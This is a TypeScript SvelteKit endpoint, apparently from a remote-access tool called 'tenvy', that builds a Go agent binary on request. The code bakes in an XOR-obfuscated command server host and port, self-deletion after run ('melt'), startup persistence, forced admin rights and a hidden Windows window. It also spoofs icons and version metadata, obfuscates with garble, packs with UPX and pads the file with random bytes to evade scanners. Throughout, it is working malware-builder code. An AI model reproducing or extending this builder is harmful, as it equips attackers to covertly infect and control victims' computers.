import { json, error } from '@sveltejs/kit';
import type { RequestHandler } from './$types';
import { mkdtemp, rm, mkdir, copyFile, chmod, cp, writeFile, stat, open } from 'node:fs/promises';
import { dirname, join, resolve } from 'node:path';
import { tmpdir } from 'node:os';
import { spawn } from 'node:child_process';
import type { SpawnOptions } from 'node:child_process';
import { randomBytes } from 'node:crypto';
import { type BuildRequest, type BuildResponse } from '../../../../../shared/types/build';
import {
	encodeRuntimeConfig,
	generateXorKey,
	hasFileInformationPayload,
	mutexSanitizer,
	normalizeBuildRequestPayload,
	obfuscateString,
	parseVersionParts,
	sanitizeFileInformationPayload,
	type NormalizedFileInformation
} from './normalizer';

const maxIconBytes = 512 * 1024;

const sharedGoPackages = ['pluginmanifest'] as const;

function encodeBase64(value: string): string {
	return Buffer.from(value, 'utf8').toString('base64');
}

type NormalizedFileIcon = { filename: string; buffer: Buffer } | null;

type CgoToolchain = {
	cc: string;
	cxx?: string;
	env?: Record<string, string>;
};

function sanitizeIconFilename(name: string | null | undefined): string {
	if (typeof name !== 'string') {
		return 'icon.ico';
	}
	const trimmed = name.trim();
	if (!trimmed) {
		return 'icon.ico';
	}
	const lower = trimmed.toLowerCase();
	if (!lower.endsWith('.ico')) {
		return 'icon.ico';
	}
	const safe = trimmed.replace(mutexSanitizer, '_').slice(0, 64);
	return safe || 'icon.ico';
}

function normalizeFileIcon(
	payload: BuildRequest['fileIcon'] | null | undefined
): NormalizedFileIcon {
	if (!payload || typeof payload.data !== 'string') {
		return null;
	}
	const trimmed = payload.data.trim();
	if (!trimmed) {
		return null;
	}
	let buffer: Buffer;
	try {
		buffer = Buffer.from(trimmed, 'base64');
	} catch {
		throw error(400, 'Icon payload must be valid base64 data.');
	}
	if (buffer.length === 0) {
		return null;
	}
	if (buffer.length > maxIconBytes) {
		throw error(400, `Icon payload exceeds ${maxIconBytes} bytes.`);
	}
	return {
		filename: sanitizeIconFilename(payload.name ?? null),
		buffer
	};
}

function buildVersionInfoConfig(
	info: NormalizedFileInformation,
	iconFileName: string | null
): Record<string, unknown> {
	const config: Record<string, unknown> = {
		VarFileInfo: {
			Translation: {
				LangID: '0409',
				CharsetID: '04B0'
			}
		}
	};

	if (iconFileName) {
		config.IconPath = iconFileName;
	}

	if (hasFileInformationPayload(info)) {
		config.StringFileInfo = info;
	}

	const fileVersion = parseVersionParts(info.FileVersion);
	const productVersion = parseVersionParts(info.ProductVersion);

	if (fileVersion || productVersion) {
		config.FixedFileInfo = {
			FileVersion: fileVersion ?? { Major: 0, Minor: 0, Patch: 0, Build: 0 },
			ProductVersion: productVersion ?? fileVersion ?? { Major: 0, Minor: 0, Patch: 0, Build: 0 },
			FileFlagsMask: '3f',
			FileFlags: '00',
			FileOS: '040004',
			FileType: '01',
			FileSubtype: '00'
		} satisfies Record<string, unknown>;
	}

	return config;
}

async function runCommand(
	command: string,
	args: readonly string[],
	options: SpawnOptions,
	output: string[]
): Promise<number> {
	return await new Promise((resolveCommand, rejectCommand) => {
		const child = spawn(command, args, options);

		child.stdout?.on('data', (chunk) => {
			output.push(chunk.toString());
		});

		child.stderr?.on('data', (chunk) => {
			output.push(chunk.toString());
		});

		child.on('error', rejectCommand);
		child.on('close', (code) => resolveCommand(code ?? 0));
	});
}

async function checkGarbleAvailability(): Promise<boolean> {
	try {
		const exitCode = await runCommand(
			'garble',
			['version'],
			{ stdio: ['ignore', 'ignore', 'ignore'] },
			[]
		);
		return exitCode === 0;
	} catch {
		return false;
	}
}

async function compressBinaryWithUpx(
	binaryPath: string,
	output: string[],
	warnings: string[]
): Promise<void> {
	try {
		const exitCode = await runCommand(
			'upx',
			['--best', '--lzma', binaryPath],
			{
				cwd: dirname(binaryPath),
				env: process.env,
				stdio: ['pipe', 'pipe', 'pipe']
			},
			output
		);
		if (exitCode !== 0) {
			warnings.push(`Binary compression exited with code ${exitCode}. Artifact left uncompressed.`);
		}
	} catch (err) {
		const code = (err as NodeJS.ErrnoException).code;
		if (code === 'ENOENT') {
			warnings.push('Compression skipped: upx binary is not available in the build environment.');
			return;
		}
		const message = err instanceof Error ? err.message : 'Unknown compression error.';
		warnings.push(`Compression failed: ${message}`);
	}
}

async function padBinaryToSize(
	binaryPath: string,
	targetBytes: number,
	warnings: string[]
): Promise<void> {
	if (!Number.isFinite(targetBytes) || targetBytes <= 0) {
		return;
	}

	try {
		const stats = await stat(binaryPath);
		if (stats.size >= targetBytes) {
			return;
		}

		let remaining = targetBytes - stats.size;
		const handle = await open(binaryPath, 'a');
		try {
			const chunkSize = 1024 * 1024;
			while (remaining > 0) {
				const writeSize = Math.min(remaining, chunkSize);
				const filler = randomBytes(writeSize);
				await handle.write(filler);
				remaining -= writeSize;
			}
		} finally {
			await handle.close();
		}
	} catch (err) {
		const message = err instanceof Error ? err.message : 'Unknown padding error.';
		warnings.push(`File padding failed: ${message}`);
	}
}

function generateSharedSecret(): string {
	return randomBytes(32).toString('hex');
}

function resolveCgoToolchain(targetOS: string, targetArch: string): CgoToolchain | null {
	const key = `${targetOS}/${targetArch}`;
	const toolchains: Record<string, CgoToolchain> = {
		'windows/amd64': { cc: 'x86_64-w64-mingw32-gcc', cxx: 'x86_64-w64-mingw32-g++' },
		'windows/386': { cc: 'i686-w64-mingw32-gcc', cxx: 'i686-w64-mingw32-g++' },
		'windows/arm64': { cc: 'aarch64-w64-mingw32-gcc', cxx: 'aarch64-w64-mingw32-g++' },
		'linux/amd64': { cc: 'gcc', cxx: 'g++' },
		'linux/arm64': { cc: 'aarch64-linux-gnu-gcc', cxx: 'aarch64-linux-gnu-g++' },
		'darwin/amd64': { cc: 'o64-clang', cxx: 'o64-clang++' },
		'darwin/arm64': { cc: 'oa64-clang', cxx: 'oa64-clang++' }
	};

	return toolchains[key] ?? null;
}

export const POST: RequestHandler = async ({ request }) => {
	let body: unknown;
	try {
		body = await request.json();
	} catch {
		throw error(400, 'Invalid build payload');
	}

	const normalized = normalizeBuildRequestPayload(body);
	const {
		host,
		port,
		targetOS,
		targetArch,
		outputFilename,
		installationPath,
		meltAfterRun,
		startupOnBoot,
		developerMode,
		mutexName,
		compressBinary,
		obfuscateBinary,
		forceAdmin,
		pollIntervalMs,
		maxBackoffMs,
		shellTimeoutSeconds,
		fileIcon,
		fileInformation,
		audio,
		filePumper
	} = normalized;
	const sharedSecret = generateSharedSecret();
	const iconPayload = normalizeFileIcon(fileIcon ?? null);
	const fileInformationPayload = sanitizeFileInformationPayload(fileInformation ?? null);
	const shouldEmbedResources =
		targetOS === 'windows' &&
		(iconPayload !== null || hasFileInformationPayload(fileInformationPayload));

	const repoRoot = resolve(process.cwd(), '..');
	let tempDir: string | null = null;
	const buildOutput: string[] = [];
	const warnings: string[] = [];

	try {
		tempDir = await mkdtemp(join(tmpdir(), 'tenvy-build-'));
		const workDir = join(tempDir, 'src');
		await cp(join(repoRoot, 'tenvy-client'), workDir, { recursive: true });

		if (sharedGoPackages.length > 0) {
			const sharedRoot = join(tempDir, 'shared');
			await mkdir(sharedRoot, { recursive: true });

			await Promise.all(
				sharedGoPackages.map(async (sharedPackage) => {
					await cp(join(repoRoot, 'shared', sharedPackage), join(sharedRoot, sharedPackage), {
						recursive: true
					});
				})
			);
		}
		const tempBinaryPath = join(tempDir, outputFilename);

		const buildXorKey = generateXorKey();
		const ldflagsParts = [
			`-X main.defaultBuildXorKey=${buildXorKey}`,
			`-X main.defaultServerHostEncoded=${obfuscateString(host, buildXorKey)}`,
			`-X main.defaultServerPortEncoded=${obfuscateString(port, buildXorKey)}`,
			`-X main.defaultInstallPathEncoded=${obfuscateString(installationPath, buildXorKey)}`,
			`-X main.defaultEncryptionKeyEncoded=${obfuscateString(sharedSecret, buildXorKey)}`,
			`-X main.defaultMeltAfterRun=${meltAfterRun ? 'true' : 'false'}`,
			`-X main.defaultStartupOnBoot=${startupOnBoot ? 'true' : 'false'}`,
			`-X main.defaultMutexKeyEncoded=${obfuscateString(mutexName, buildXorKey)}`,
			`-X main.defaultForceAdminRequirement=${forceAdmin ? 'true' : 'false'}`
		];

		if (pollIntervalMs) {
			ldflagsParts.push(`-X main.defaultPollIntervalOverrideMs=${pollIntervalMs}`);
		}
		if (maxBackoffMs) {
			ldflagsParts.push(`-X main.defaultMaxBackoffOverrideMs=${maxBackoffMs}`);
		}
		if (shellTimeoutSeconds) {
			ldflagsParts.push(`-X main.defaultShellTimeoutOverrideSecs=${shellTimeoutSeconds}`);
		}
		if (compressBinary) {
			ldflagsParts.push('-s -w');
		}

		const encodedRuntimeConfig = encodeRuntimeConfig(normalized);
		if (encodedRuntimeConfig) {
			ldflagsParts.push(`-X main.defaultRuntimeConfigEncoded=${encodedRuntimeConfig}`);
		}

		if (!developerMode && targetOS === 'windows') {
			ldflagsParts.push('-H=windowsgui');
		}

		if (shouldEmbedResources) {
			const loaderDir = join(workDir, 'cmd', 'loader');
			const iconFileName = iconPayload?.filename ?? null;
			const versionConfig = buildVersionInfoConfig(fileInformationPayload, iconFileName);
			await writeFile(
				join(loaderDir, 'versioninfo.json'),
				`${JSON.stringify(versionConfig, null, 2)}\n`,
				'utf8'
			);
			if (iconPayload) {
				await writeFile(join(loaderDir, iconPayload.filename), iconPayload.buffer);
			}
			const goversionArgs = [
				'run',
				'github.com/josephspurrier/goversioninfo/cmd/goversioninfo@v1.4.0',
				'-64'
			] as const;
			const goversionExit = await runCommand(
				'go',
				goversionArgs,
				{
					cwd: loaderDir,
					env: process.env,
					stdio: ['pipe', 'pipe', 'pipe']
				},
				buildOutput
			);
			if (goversionExit !== 0) {
				warnings.push(
					`Embedding Windows resources failed with exit code ${goversionExit}. Continuing without version metadata.`
				);
			}
		}

		const ldflags = ldflagsParts.join(' ');

		const buildTags: string[] = [];
		const audioStreamingRequested = audio.streaming === 'enabled';
		const audioStubRequested = audio.streaming === 'disabled';

		if (audioStubRequested) {
			buildTags.push('tenvy_no_audio');
			warnings.push('Audio streaming support disabled by operator request.');
		}

		const goArgs: string[] = ['build', '-ldflags', ldflags];
		if (buildTags.length > 0) {
			goArgs.push('-tags', buildTags.join(','));
		}
		goArgs.push('-o', tempBinaryPath, './cmd/loader');

		const goEnv: NodeJS.ProcessEnv = {
			...process.env,
			GOOS: targetOS,
			GOARCH: targetArch,
			CGO_ENABLED: '0'
		} satisfies NodeJS.ProcessEnv;

		if (audioStreamingRequested) {
			const toolchain = resolveCgoToolchain(targetOS, targetArch);
			if (!toolchain) {
				const logLines = buildOutput
					.join('')
					.split(/\r?\n/)
					.filter((line) => line.trim().length > 0);
				const response: BuildResponse = {
					success: false,
					message: `Audio streaming requires a CGO toolchain for ${targetOS}/${targetArch}, but no compiler mapping is available.`,
					log: logLines,
					warnings
				};
				return json(response, { status: 200 });
			}

			goEnv.CGO_ENABLED = '1';
			goEnv.CC = toolchain.cc;
			if (toolchain.cxx) {
				goEnv.CXX = toolchain.cxx;
			}
			if (toolchain.env) {
				for (const [key, value] of Object.entries(toolchain.env)) {
					goEnv[key] = value;
				}
			}
		}

		let buildCommand = 'go';
		let buildArgs = [...goArgs];

		if (obfuscateBinary) {
			const garbleAvailable = await checkGarbleAvailability();
			if (garbleAvailable) {
				const buildSeed = randomBytes(16).toString('hex');
				buildCommand = 'garble';
				buildArgs = ['-tiny', `-seed=${buildSeed}`, ...goArgs];
			} else {
				warnings.push('Obfuscation skipped: garble binary is not available in the build environment.');
			}
		}

		const exitCode = await runCommand(
			buildCommand,
			buildArgs,
			{
				cwd: workDir,
				env: goEnv,
				stdio: ['pipe', 'pipe', 'pipe']
			},
			buildOutput
		);

		if (exitCode !== 0) {
			const logLines = buildOutput
				.join('')
				.split(/\r?\n/)
				.filter((line) => line.trim().length > 0);
			const response: BuildResponse = {
				success: false,
				message: `go build failed with exit code ${exitCode}`,
				log: logLines,
				warnings
			};
			return json(response, { status: 200 });
		}

		if (compressBinary) {
			await compressBinaryWithUpx(tempBinaryPath, buildOutput, warnings);
		}

		if (filePumper) {
			await padBinaryToSize(tempBinaryPath, filePumper.targetBytes, warnings);
		}

		const logLines = buildOutput
			.join('')
			.split(/\r?\n/)
			.filter((line) => line.trim().length > 0);

		const buildsDir = join(repoRoot, 'tenvy-server', 'static', 'builds');
		await mkdir(buildsDir, { recursive: true });
		const finalPath = join(buildsDir, outputFilename);

		await copyFile(tempBinaryPath, finalPath);
		await chmod(finalPath, 0o755);

		const response: BuildResponse = {
			success: true,
			message: 'Agent built successfully',
			outputPath: finalPath,
			downloadUrl: `/builds/${encodeURIComponent(outputFilename)}`,
			log: logLines,
			sharedSecret,
			warnings
		};

		return json(response);
	} catch (err) {
		const captured = buildOutput
			.join('')
			.split(/\r?\n/)
			.filter((line) => line.trim().length > 0);

		if (err instanceof Error && (err as NodeJS.ErrnoException).code === 'ENOENT') {
			return json(
				{
					success: false,
					message: 'Go compiler is not available in the build environment.',
					log: captured,
					warnings
				},
				{ status: 200 }
			);
		}

		const message = err instanceof Error ? err.message : 'Failed to build agent';
		return json(
			{
				success: false,
				message,
				log: captured,
				warnings
			},
			{ status: 200 }
		);
	} finally {
		if (tempDir) {
			await rm(tempDir, { recursive: true, force: true });
		}
	}
};
